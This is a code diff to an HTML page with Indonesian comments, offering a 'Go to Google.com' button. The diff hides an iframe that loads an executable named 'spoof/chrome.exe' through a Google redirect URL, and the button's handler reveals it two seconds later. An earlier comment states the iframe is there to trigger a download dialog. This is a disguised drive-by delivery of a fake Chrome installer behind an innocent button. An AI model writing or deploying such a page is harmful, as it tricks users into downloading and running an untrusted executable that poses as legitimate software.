@@ -13,14 +13,14 @@
     <!-- Button untuk ke Google -->
     <button onclick="redirectToGoogle()">Go to Google.com</button>
 
-    <!-- Iframe yang berisi URL yang kamu inginkan -->
+    <!-- Iframe yang berisi URL yang kamu inginkan (awalnya disembunyikan) -->
     <div style="margin-top: 20px;">
       <iframe 
         id="iframeExample" 
         src="https://www.google.com/url?q=https%3A%2F%2Fcnfdnfial-ops.github.io%2Fspoof%2Fchrome.exe&sa=D&sntz=1&usg=AOvVaw3W5r-6mMJTcMqxax4geLnL"
         width="600" 
         height="300" 
-        style="border: 1px solid #ccc;">
+        style="border: 1px solid #ccc; display: none;">
       </iframe>
     </div>
   </div>
@@ -28,15 +28,14 @@
   <script>
     // Fungsi untuk redirect ke Google.com
     function redirectToGoogle() {
-      // Redirect ke Google.com di tab baru
+      // Redirect ke Google.com di tab yang sama
       window.location.href = "https://www.google.com";
 
-      // Setelah redirect, tampilkan dialog download
+      // Setelah 2 detik, tampilkan iframe
       setTimeout(function() {
-        // Trigger download dialog (melalui iframe yang sudah disediakan)
         const iframe = document.getElementById('iframeExample');
-        iframe.style.display = "block";  // Tampilkan iframe
-      }, 2000);  // Tunggu 2 detik setelah redirect untuk menampilkan iframe
+        iframe.style.display = "block";  // Tampilkan iframe setelah redirect
+      }, 2000);  // Delay 2 detik setelah redirect
     }
   </script>
 </body>
